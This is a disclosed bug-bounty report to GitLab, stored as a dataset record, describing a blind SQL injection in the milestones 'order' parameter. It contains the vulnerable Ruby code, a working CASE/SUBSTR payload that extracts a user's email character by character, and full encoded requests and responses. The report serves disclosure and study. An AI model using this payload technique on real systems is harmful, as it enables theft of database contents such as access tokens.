{
  "reported_to": "GitLab",
  "reported_by": "jobert ",
  "title": "SQL injection in MilestoneFinder order method",
  "content": "\nThe MilestoneFinder is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the Groups::MilestonesController. When the index action is requested, the milestones method is called. Here's the first two lines of the method:\napp/controllers/groups/milestones_controller.rb\nCode 140 Bytes\n1def milestones\n2    search_params = params.merge(group_ids: group.id)\n3\n4    milestones = MilestonesFinder.new(search_params).execute\n5    # ...\nThis code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the execute method. Here's the method:\napp/finders/milestone_finder.rb\nCode 230 Bytes\n1  def execute\n2    return Milestone.none if project_ids.empty? && group_ids.empty?\n3\n4    items = Milestone.all\n5    items = by_groups_and_projects(items)\n6    items = by_title(items)\n7    items = by_state(items)\n8\n9    order(items)\n10  end\nThe order call on the last line is implemented as following:\napp/finders/milestone_finder.rb\nCode 221 Bytes\n1 def order(items)\n2    if params.has_key?(:order)\n3      items.reorder(params[:order])\n4    else\n5      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')\n6      items.reorder(order_statement)\n7    end\n8  end\nAs can be seen on line 2 of the method, reorder is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here's a request example:\nRequest\nCode 93 Bytes\n1GET /groups/my-test-group/-/milestones HTTP/1.1\n2Host: gitlab.com\n3Accept: application/json\n4...\nResponse\nCode 124 Bytes\n1[\n2  {\n3    \"title\": \"3\",\n4    \"name\": \"3\",\n5    \"id\": 429944\n6  },\n7  {\n8    \"title\": \"4\",\n9    \"name\": \"4\",\n10    \"id\": 429943\n11  }\n12]\nThen, consider the following SQL injection payload:\nCode 141 Bytes\n1(CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)\nThis payload does three things: it fetches the email column from the users table where the username matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the email (the SUBSTR(<>, 1, 1) call) and compares that to a a. If that's the case, it'll compare the id of the current milestone to 429944. If that is true, it'll sort on column number 2. If that is not the case, it'll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character a.\nTo prepare the payload, replace 429944 in the payload with a milestone ID of your account and URL encode it:\nEncoded payload\nCode 221 Bytes\n1%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29\nNow submit the first request:\nRequest 1 (a)\nCode 342 Bytes\n1GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\n2Host: gitlab.com\n3Accept: application/json\n4...\nResponse 1\nCode 110 Bytes\n1HTTP/1.1 200 OK\n2Server: nginx\n3...\n4\n5[{\"title\":\"3\",\"name\":\"3\",\"id\":429944},{\"title\":\"4\",\"name\":\"4\",\"id\":429943}]\nIn the response above the milestones are sorted descending based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter j, the following behavior is observer:\nRequest 2 (j)\nCode 342 Bytes\n1GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\n2Host: gitlab.com\n3Accept: application/json\n4...\nResponse 2\nCode 110 Bytes\n1HTTP/1.1 200 OK\n2Server: nginx\n3...\n4\n5[{\"title\":\"4\",\"name\":\"4\",\"id\":429943},{\"title\":\"3\",\"name\":\"3\",\"id\":429944}]\nBecause the first character of my email is actually j, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the SUBSTR function can be changed to guess characters on other positions of the value.\nThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\nImpact\nAn attacker can extract all information from the a GitLab instance's database, including private access and shell tokens. These can be used to elevate the user's privileges, which may lead to arbitrary code execution.\n\n",
  "severity": [
    9.9,
    null
  ],
  "bounty": 2000,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1524810000,
  "report_url": "https://hackerone.com/reports/298176",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a new group on a GitLab instance and create two milestones within it."
    ],
    [
      2,
      "Send a crafted GET request to the group milestones endpoint with a malicious SQL injection payload in the 'order' parameter to extract sensitive data from the database."
    ]
  ],
  "vuln_description": "The vulnerability is a SQL injection in the MilestoneFinder class of GitLab, specifically in the order method. The method directly uses user-supplied input in the 'order' parameter without proper sanitization, allowing an attacker to inject arbitrary SQL queries. This can be exploited to extract sensitive information from the database, including private access and shell tokens, potentially leading to privilege escalation and arbitrary code execution.",
  "reason": "The attack involves understanding the application's use of the MilestoneFinder class and how it processes the 'order' parameter. The attacker must craft a specific SQL injection payload that manipulates the query's ORDER BY clause to extract data through boolean-based blind SQL injection techniques. While the vulnerability itself is straightforward (unsanitized input in SQL query), crafting the correct payload requires knowledge of SQL injection techniques and the application's response behavior.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability in the MilestoneFinder's order method involves manipulating the 'order' parameter in the request to execute arbitrary SQL queries. This is not directly related to authentication or authorization bypass, but rather a data validation and sanitization issue. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, which does not apply to this type of vulnerability.",
    "is_detectable": false
  }
}